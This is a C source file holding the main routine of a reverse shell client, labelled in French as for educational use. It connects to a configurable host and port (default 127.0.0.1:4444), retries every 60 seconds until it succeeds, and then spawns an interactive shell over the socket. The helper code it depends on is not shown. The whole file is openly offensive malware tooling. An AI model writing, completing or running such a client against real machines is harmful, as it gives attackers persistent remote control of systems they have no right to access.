#include "connection.h"
#include "commands.h"
#include "../utils/crypto.h"

#define SERVER_IP "127.0.0.1"
#define SERVER_PORT 4444
#define RETRY_DELAY 60

int main(int argc, char **argv) {
    printf("╔══════════════════════════════════════════════╗\n");
    printf("║    REVERSE SHELL CLIENT (Usage Éducatif)     ║\n");
    printf("╚══════════════════════════════════════════════╝\n\n");
    
    const char *ip = (argc > 1) ? argv[1] : SERVER_IP;
    int port = (argc > 2) ? atoi(argv[2]) : SERVER_PORT;
    
    INFO_PRINT("Target: %s:%d", ip, port);
    INFO_PRINT("Attempting connection...");
    
    // Connexion avec retry
    int sock = reconnect_loop(ip, port, RETRY_DELAY);
    
    if (sock < 0) {
        ERROR_PRINT("Failed to connect");
        return 1;
    }
    
    INFO_PRINT("Connection established!");
    
    // Lancer shell interactif
    spawn_shell(sock);
    
    // Ne devrait jamais arriver ici
    close_connection(sock);
    return 0;
}

